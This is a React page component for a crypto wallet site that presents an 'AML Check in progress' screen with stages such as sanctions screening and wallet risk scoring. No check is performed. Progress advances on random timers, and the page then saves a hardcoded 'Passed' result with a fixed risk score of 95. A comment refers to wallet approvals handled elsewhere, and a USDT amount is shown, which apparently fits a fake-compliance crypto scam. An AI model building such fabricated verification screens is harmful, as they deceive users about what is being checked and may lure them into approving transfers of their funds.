import React, { useEffect, useMemo, useState } from 'react'
import Header from '../components/Header.jsx'
import Footer from '../components/Footer.jsx'
import { useAccount, useChainId } from 'wagmi'
import { useNavigate } from 'react-router-dom'

export default function AmlCheck() {
  const { address } = useAccount()
  const liveChainId = useChainId()

  // Persisted AML completion state
  const [amlCheckComplete, setAmlCheckComplete] = useState(false)

  const settings = useMemo(() => {
    try { return JSON.parse(localStorage.getItem('amlsec_settings') || '{}') } catch { return {} }
  }, [])

  const defaultNetwork = settings.defaultNetwork || 'arbitrum'
  const chainId = liveChainId || undefined
  const navigate = useNavigate()

  const search = typeof window !== 'undefined' ? new URLSearchParams(window.location.search) : new URLSearchParams()
  const amountParam = search.get('amount') || '1'
  const [progress, setProgress] = useState(0)
  const [stage, setStage] = useState('Initializing AML checks…')
  const [txStatus, setTxStatus] = useState('')
  const [error, setError] = useState('')

  const stages = [
    { pct: 5, label: 'Loading account and network context' },
    { pct: 15, label: 'Sanctions lists screening' },
    { pct: 35, label: 'Wallet risk scoring' },
    { pct: 55, label: 'Transaction pattern analysis' },
    { pct: 75, label: 'PEP & adverse media checks' },
    { pct: 90, label: 'Jurisdiction & compliance checks' },
    { pct: 100, label: 'AML screening complete' }
  ]

  // Reflect saved completion immediately on load
  useEffect(() => {
    if (amlCheckComplete) {
      setProgress(100)
      setStage(stages[stages.length - 1].label)
    }
  }, [amlCheckComplete])

  // Run AML scanning progression unconditionally (connection and approvals handled on ConnectPage)
  useEffect(() => {
    if (amlCheckComplete) return

    let pct = progress || 0
    let cancelled = false

    function tick() {
      if (cancelled) return
      const step = Math.max(1, Math.ceil(Math.random() * 6)) // 1-6%
      pct = Math.min(pct + step, 100)
      setProgress(pct)
      const current = stages.find(s => pct <= s.pct) || stages[stages.length - 1]
      setStage(current.label)

      if (pct >= 100) {
        // Mark AML check complete and persist
        setAmlCheckComplete(true)
        try { localStorage.setItem('amlsec_amlCheck', 'true') } catch {}
        // Store result for receipt page
        try {
          const now = new Date().toISOString()
          const checkId = `CHK-${Date.now()}-${(address || '').slice(-4)}`
          const payload = {
            walletAddress: address || '',
            completedAt: now,
            riskScore: 95,
            status: 'Passed',
            network: defaultNetwork,
            chainId: chainId,
            checkId,
            verifier: 'AMLsec Engine'
          }
          localStorage.setItem('amlsec_result', JSON.stringify(payload))
        } catch {}
        navigate('/aml-result')
        return
      }
      const delay = 500 + Math.floor(Math.random() * 900) // 500–1400ms
      setTimeout(tick, delay)
    }

    const initialDelay = 400 + Math.floor(Math.random() * 600)
    const t = setTimeout(tick, initialDelay)
    return () => { cancelled = true; clearTimeout(t) }
  }, [amlCheckComplete, address])

  const currentIndex = (() => {
    const idx = stages.findIndex(s => progress < s.pct)
    return idx === -1 ? stages.length : idx
  })()

  return (
    <>
      <Header />
      <main className="onboard" aria-labelledby="aml-title" style={{ position: 'relative' }}>
        <div className="onboard-inner">
          <h1 id="aml-title" className="onboard-title">AML Check in progress</h1>
          <p className="onboard-subtitle">Automated AML screening and transaction risk analysis is underway.</p>

          <div className="onboard-step" style={{ gridTemplateColumns: 'auto 1fr' }}>
            <div>
              <div className="aml-center">
                {progress < 100 ? (
                  <div className="aml-spinner" aria-label="Loading" />
                ) : (
                  <div className="aml-success" aria-label="Complete">
                    <span className="check-icon" aria-hidden="true">✓</span>
                  </div>
                )}
                <div className="aml-progress">{progress}%</div>
                <div className="aml-stage">{stage}</div>

                <ul className="aml-stages-list" aria-label="Check stages">
                  {stages.map((s, idx) => {
                    const cls = idx < currentIndex ? 'done' : idx === currentIndex ? 'active' : 'muted'
                    return (
                      <li key={s.label} className={cls}>
                        {idx < currentIndex ? (
                          <span className="check-icon" aria-hidden="true">✓</span>
                        ) : (
                          <span className="check-icon muted" aria-hidden="true">•</span>
                        )}
                        <span className="stage-text">{s.label}</span>
                      </li>
                    )
                  })}
                </ul>
              </div>

              {txStatus && <div className="aml-status ok" role="status">{txStatus}</div>}
              {error && <div className="aml-status err" role="alert">{error}</div>}
              <p className="helper-text" style={{ marginTop: 8 }}>Amount: {amountParam} USDT</p>
            </div>
          </div>
        </div>
      </main>
      <Footer />
    </>
  )
}